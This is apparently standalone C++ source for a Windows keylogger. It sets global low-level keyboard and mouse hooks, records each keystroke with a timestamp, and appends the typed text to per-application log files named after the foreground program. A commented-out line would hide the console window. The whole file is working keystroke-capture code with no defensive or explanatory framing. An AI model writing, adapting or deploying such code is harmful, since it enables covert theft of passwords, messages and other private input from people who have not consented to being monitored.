#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <map>
#include<thread>
#include <chrono>
HHOOK keyboardHook;
HHOOK mouseHook;
SYSTEMTIME lt;

std::string inputBuffer;
std::wstring prevExeName;
std::wstring currentExeName;
std::wofstream outputFile;
std::map<std::wstring, std::wofstream> fileMap; 


std::wstring GetExecutableNameWithoutExtension(const std::wstring& exeName) {
    size_t lastDotPos = exeName.find_last_of(L".");
    if (lastDotPos != std::wstring::npos) {
        return exeName.substr(0, lastDotPos);
    }
    return exeName;
}

bool FileExists(const std::wstring& fileName) {
    std::ifstream file(fileName);
    return file.good();
}

void InitializeOutputFile(const std::wstring& exeName) {
    std::wstring exeNameWithoutExtension = GetExecutableNameWithoutExtension(exeName);
    std::wstring fileName = exeNameWithoutExtension + L".txt";

    if (fileMap.find(exeName) == fileMap.end()) {
   
        std::wofstream newFile(fileName, std::ios::out | std::ios::app);
        newFile.imbue(std::locale("")); 
        fileMap[exeName] = std::move(newFile);
    }

  
    outputFile = std::move(fileMap[exeName]);
}

void WriteToConsoleAndFile(const std::wstring& text) {
   // std::wcout << text;
    outputFile << text;
    outputFile.flush();
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN) {
            char key = MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR);
            key = tolower(key);

            if (key == VK_RETURN) {
                GetLocalTime(&lt);
                std::wstringstream line;
                line << L"[" << lt.wHour << L":" << lt.wMinute << L"] " << std::wstring(inputBuffer.begin(), inputBuffer.end()) << std::endl;
                WriteToConsoleAndFile(line.str());
                inputBuffer.clear();
            }
            else if (key == VK_BACK) {
                if (!inputBuffer.empty()) {
                    inputBuffer.pop_back();
                    WriteToConsoleAndFile(L"\b \b");
                }
            }
            else {
                inputBuffer += key;
                WriteToConsoleAndFile(std::wstring(1, key));
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        MSLLHOOKSTRUCT m = *(MSLLHOOKSTRUCT*)lParam;
        if (wParam == WM_LBUTTONDOWN) {
            //  std::cout << m.pt.x << " " << m.pt.y << std::endl;
        }
    }
    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
}

int main() {
    //Hide the console window
    //::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        std::cerr << "Failed to set up keyboard hook." << std::endl;
        return 1;
    }

    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
    if (mouseHook == NULL) {
        std::cerr << "Failed to set up mouse hook." << std::endl;
        return 1;
    }

    while (true) {
        HWND foregroundWindow = GetForegroundWindow();
        GetLocalTime(&lt);
        DWORD procid;
        GetWindowThreadProcessId(foregroundWindow, &procid);

        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procid);

        std::vector<wchar_t> exePath(MAX_PATH);
        DWORD exePathSize = static_cast<DWORD>(exePath.size());
        QueryFullProcessImageName(processHandle, 0, exePath.data(), &exePathSize);

        std::wstring exeName = exePath.data();
        size_t lastSlashPos = exeName.find_last_of(L"\\/");
        if (lastSlashPos != std::wstring::npos) {
            exeName = exeName.substr(lastSlashPos + 1);
        }

        if (exeName != currentExeName) {
            std::wcout << std::endl;
            std::wcout << exeName << std::endl;
            currentExeName = exeName;
            InitializeOutputFile(exeName);
        }

        CloseHandle(processHandle);

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (GetKeyState(VK_ESCAPE) & 0x8000) {
            UnhookWindowsHookEx(keyboardHook);
            UnhookWindowsHookEx(mouseHook);
            outputFile.close();
            break;
        }
        std::chrono::microseconds dura(2000);
    }

    return 0;
}
